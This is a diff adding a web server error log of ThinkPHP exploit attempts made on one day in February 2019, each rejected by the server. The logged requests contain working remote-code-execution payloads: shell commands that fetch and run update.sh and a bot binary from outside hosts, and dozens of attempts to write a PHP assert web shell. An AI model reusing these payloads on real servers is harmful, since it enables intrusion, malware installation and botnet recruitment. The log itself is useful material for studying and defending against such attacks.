@@ -1,0 +1,144 @@
+[ 2019-02-20T02:07:05+08:00 ] 37.44.214.30 /index.php%3Fs%3D%2Findex%2F%5Cthink%5Capp%2Finvokefunction%26function%3Dcall_user_func_array%26vars%5B0%5D%3Dshell_exec%26vars%5B1%5D%5B%5D%3D%20%27mkdir%20%2Ftmp%2Fmeme%2F%3B%20wget%20http%3A%2F%2F37.44.214.30%3A80%2Fall%2Fupdate.sh%20-O%20%2Ftmp%2Fmeme%2Fupdate.sh%3B%20chmod%20777%20%2Ftmp%2Fmeme%2Fupdate.sh%3B%20sh%20%2Ftmp%2Fmeme%2Fupdate.sh%3B%27
+ERR: 无法加载控制器:Index.php?s=
+
+[ 2019-02-20T02:07:05+08:00 ] 37.44.214.30 /?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=mkdir /tmp/meme/; wget http://37.44.214.30:80/all/update.sh -O /tmp/meme/update.sh; chmod 777 /tmp/meme/update.sh; sh /tmp/meme/update.sh;
+ERR: 非法操作:\think\Container
+
+[ 2019-02-20T02:07:05+08:00 ] 37.44.214.30 /?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=mkdir /tmp/meme/; wget http://37.44.214.30:80/all/update.sh -O /tmp/meme/update.sh; chmod 777 /tmp/meme/update.sh; sh /tmp/meme/update.sh;
+ERR: 非法操作:\think\app
+
+[ 2019-02-20T08:17:53+08:00 ] 37.44.214.30 /index.php%3Fs%3D%2Findex%2F%5Cthink%5Capp%2Finvokefunction%26function%3Dcall_user_func_array%26vars%5B0%5D%3Dshell_exec%26vars%5B1%5D%5B%5D%3D%20%27mkdir%20%2Ftmp%2Fmeme%2F%3B%20wget%20http%3A%2F%2F37.44.214.30%3A80%2Fall%2Fupdate.sh%20-O%20%2Ftmp%2Fmeme%2Fupdate.sh%3B%20chmod%20777%20%2Ftmp%2Fmeme%2Fupdate.sh%3B%20sh%20%2Ftmp%2Fmeme%2Fupdate.sh%3B%27
+ERR: 无法加载控制器:Index.php?s=
+
+[ 2019-02-20T08:17:53+08:00 ] 37.44.214.30 /?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=mkdir /tmp/meme/; wget http://37.44.214.30:80/all/update.sh -O /tmp/meme/update.sh; chmod 777 /tmp/meme/update.sh; sh /tmp/meme/update.sh;
+ERR: 非法操作:\think\Container
+
+[ 2019-02-20T08:17:54+08:00 ] 37.44.214.30 /?s=index/\think\Request/input&filter=system&data=mkdir /tmp/meme/; wget http://37.44.214.30:80/all/update.sh -O /tmp/meme/update.sh; chmod 777 /tmp/meme/update.sh; sh /tmp/meme/update.sh;
+ERR: 非法操作:\think\Request
+
+[ 2019-02-20T08:17:54+08:00 ] 37.44.214.30 /?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=mkdir /tmp/meme/; wget http://37.44.214.30:80/all/update.sh -O /tmp/meme/update.sh; chmod 777 /tmp/meme/update.sh; sh /tmp/meme/update.sh;
+ERR: 非法操作:\think\app
+
+[ 2019-02-20T12:56:25+08:00 ] 116.255.172.180 /webdav/
+ERR: 无法加载控制器:Webdav
+
+[ 2019-02-20T12:57:24+08:00 ] 116.255.172.180 /manager/html
+ERR: 无法加载控制器:Manager
+
+[ 2019-02-20T15:00:11+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T15:12:34+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T15:25:09+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T15:37:30+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T15:49:52+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T15:54:36+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T16:05:44+08:00 ] 134.209.10.161 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http%3A%2F%2F142.93.82.179%2Fbins%2Fapep.x86%20-O%20%2Ftmp%2F.gayboi%3B%20chmod%20777%20%2Ftmp%2F.gayboi%3B%20%2Ftmp%2F.gayboi%20thinkphp.x86
+ERR: 非法操作:\think\app
+
+[ 2019-02-20T16:07:08+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T16:19:36+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T16:31:59+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T16:44:24+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T16:56:55+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T16:57:31+08:00 ] 58.251.121.184 /webdav
+ERR: 无法加载控制器:Webdav
+
+[ 2019-02-20T17:09:20+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T17:21:45+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T17:34:06+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T17:46:32+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T17:59:06+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T18:11:26+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T18:23:44+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T18:36:06+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T18:48:26+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T19:00:48+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T19:13:12+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T19:25:40+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T19:38:08+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T19:50:33+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T20:02:59+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T21:49:21+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T22:01:21+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T22:13:22+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T22:25:20+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T22:37:29+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T22:49:31+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T23:01:36+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T23:13:51+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T23:26:02+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T23:38:09+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
+[ 2019-02-20T23:50:08+08:00 ] 207.148.105.19 /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][1]=<?php assert($_POST['fuck'])?>
+ERR: 非法操作:think\app
+
